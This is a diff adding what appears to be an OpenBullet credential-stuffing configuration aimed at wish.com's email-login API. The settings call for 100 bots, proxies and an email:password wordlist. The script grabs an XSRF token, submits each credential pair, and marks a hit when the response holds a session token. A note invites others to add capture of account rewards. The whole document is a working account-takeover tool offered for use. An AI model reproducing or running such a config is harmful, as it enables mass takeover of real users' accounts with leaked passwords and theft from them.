@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Wish",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-29T21:29:05.3965418+00:00",
+  "AdditionalInfo": "Does not currently capture anything, if you have an accounts with rewards feel free to add capture.",
+  "Author": "Rebel",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.wish.com/api/email-login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.wish.com" 
+  HEADER "referer: https://www.wish.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "host: www.wish.com" 
+PARSE "<COOKIES(_xsrf)>" LR "" "" Recursive=FALSE -> VAR "xrsf" "" "" 
+REQUEST POST "https://www.wish.com/api/email-login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&_buckets=&_experiments=" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.wish.com" 
+  HEADER "referer: https://www.wish.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "host: www.wish.com" 
+  HEADER "X-XSRFToken: <xrsf>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"msg\": \"Email or Password is incorrect\", \"code\": 10, \"data\": {}" 
+  KEYCHAIN Success OR 
+    KEY "{\"msg\": \"\", \"code\": 0, \"data\": {\"signup_flow_pages\": [], \"session_token\": \"" 
